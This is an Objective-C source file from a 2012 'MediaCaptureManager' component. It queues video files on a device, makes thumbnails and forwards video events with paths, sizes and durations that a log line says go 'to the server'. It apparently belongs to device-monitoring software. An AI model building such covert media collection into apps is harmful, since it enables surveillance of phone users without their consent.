/**
 - Project name :  MediaCaptureManager
 - Class name   :  VideoCapture
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "VideoCapture.h"
#import "FxSystemEvent.h"
@implementation VideoCapture

/**
 - Method name:initWithEventDelegate:andMediaThumbnailManager
 - Purpose: This method is used initialize VideoCapture class
 - Argument list and description: aEventDelegate (EventDelegate),aMediaThumbnailDelegate(MediaThumbnailManager)
 - Return type and description: (id) VideoCapture instance
*/

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate 
	andMediaThumbnailManager: (id <MediaThumbnailManager>) aMediaThumbnailManager {
    if (self = [super init]) {
		mVideoCaptureQueue=[[NSMutableArray alloc]init];
		mEventDelegate=aEventDelegate;
		mMediaThumbnailManager=aMediaThumbnailManager;
		mIsBusy=NO;
    }
    return self;
}

/**
 - Method name:addPathToVideoQueue:
 - Purpose: This method is used  to add video path to the queue
 - Argument list and description: aVideoPath (NSString)
 - Return type and description: No Return
*/

- (void) addPathToVideoQueue: (NSString *) aVideoPath {
	DLog (@"Add video path:(%@) to the queue",aVideoPath)
	[mVideoCaptureQueue addObject:aVideoPath];
}

/**
 - Method name:processVideoCaptureQueue
 - Purpose: This method is used  to process video thumbnail generation
 - Argument list and description: No Argument
 - Return type and description: No Return
*/

- (void) processVideoCaptureQueue {
	if ([mVideoCaptureQueue count] && !mIsBusy) {
		mIsBusy=YES;
		NSString *videoPath=[mVideoCaptureQueue objectAtIndex:0];
		DLog (@"====>processVideoCaptureQueue:%@",videoPath);
		
//		NSFileManager *fileManager = [NSFileManager defaultManager];
//		NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:videoPath error:nil];
//		NSUInteger oneMeg = 1020 * 1024;
//		NSUInteger sizeInMeg = [fileAttributes fileSize] / oneMeg;
//		// Check max file size 10 Mb
//		if (sizeInMeg > 10) {
		if (0) {
			// Create system event if media is too big
			FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
			NSString *message = NSLocalizedString(@"kMediaEventTooBigCannotDeliver", @"");
			[systemEvent setMessage:message];
			[systemEvent setSystemEventType:kSystemEventTypeMediaEventMaxSizeReached];
			[systemEvent setDirection:kEventDirectionOut];
			[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
			}
			[systemEvent release];
			
			[self removeProcessedPathFromVideoCaptureQueue];
			mIsBusy = NO;
			[self performSelector:@selector(processVideoCaptureQueue) withObject:nil afterDelay:0.1];
		} else {
			[mMediaThumbnailManager createVideoThumbnail:videoPath delegate:self];
		}
	}
}

/**
 - Method name:removeProcessedPathFromVideoCaptureQueue
 - Purpose: This method is used  to remove processed video  
 - Argument list and description: No Argument
 - Return type and description: No Return
*/

- (void) removeProcessedPathFromVideoCaptureQueue {
	if ([mVideoCaptureQueue count]) {
		DLog (@"====>removeProcessedPathFromVideoCaptureQueue")
		[mVideoCaptureQueue removeObjectAtIndex:0];
	}
}

#pragma mark MediaThumbnailManager Delegate Methods
/**
 - Method name:thumbnailCreationDidFinished:mediaInfo:thumbnailPath:
 - Purpose: This method is invoked when thumbnail processig is completed.
 - Argument list and description: aError (NSError),aMedia(MediaInfo ),aPaths(id)
 - Return type and description: No Return
 */

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {
	
	DLog (@"Video thumbnail creation completed...");
	DLog (@"\n===================================\n");
	DLog (@"Media Length:%d",[aMedia mMediaLength]);
	DLog (@"Media Type:%d",[aMedia mMediaInputType]);
	DLog (@"Media Full Path:%@",[aMedia mMediaFullPath]);
	DLog (@"Media Size:%d",[aMedia mMediaSize]);
	DLog (@"Thumbnail Length:%d",[aMedia mThumbnailLength]);
	DLog (@"Thumbnail Size:%d",[aMedia mThumbnailSize]);
	DLog (@"Error Code:%d",[aError code]);
	DLog (@"Thumbnail Path(s):%@",aPaths);
	DLog (@"\n===================================");
	
   [self removeProcessedPathFromVideoCaptureQueue];
	
   if ([aError code]==kMediaThumbnailOK || [aError code]==kMediaThumbnailCannotGetThumbnail) {
	   MediaEvent *mediaEvent=[[MediaEvent alloc]init];
	   for (NSString *path in aPaths) {
		   ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
		   [tEvent setFullPath:path];
		   [tEvent setEventType:kEventTypeVideoThumbnail];	 
		   [tEvent setActualSize:[aMedia mMediaSize]];
		   [tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		   [tEvent setActualDuration:[aMedia mMediaLength]];
		   [mediaEvent addThumbnailEvent:tEvent];
		   [tEvent release];
	   }
	   if (![[mediaEvent thumbnailEvents] count]) { // No paths to frame of video
		   ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
		   [tEvent setFullPath:@""];
		   [tEvent setEventType:kEventTypeVideoThumbnail];
		   [tEvent setActualSize:[aMedia mMediaSize]];
		   [tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		   [tEvent setActualDuration:[aMedia mMediaLength]];
		   [mediaEvent addThumbnailEvent:tEvent];
		   [tEvent release];
	   }
	   [mediaEvent setFullPath:[aMedia mMediaFullPath]];
	   [mediaEvent setMDuration:[aMedia mMediaLength]];
	   [mediaEvent setEventType:kEventTypeVideo];
	   [mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	   //=============================SEND VIDEO EVENT==============================================
	   if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		   [mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent withObject:self];
		   DLog (@"Send Video event to the server")
	   }
		   [mediaEvent release];
	}
   else {
	   DLog(@"[aError code] = %d", [aError code]);
	}
	mIsBusy=NO;
	[self performSelector:@selector(processVideoCaptureQueue) withObject:nil afterDelay:0.1];
	
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	[mVideoCaptureQueue release];
	[super dealloc];
}
@end
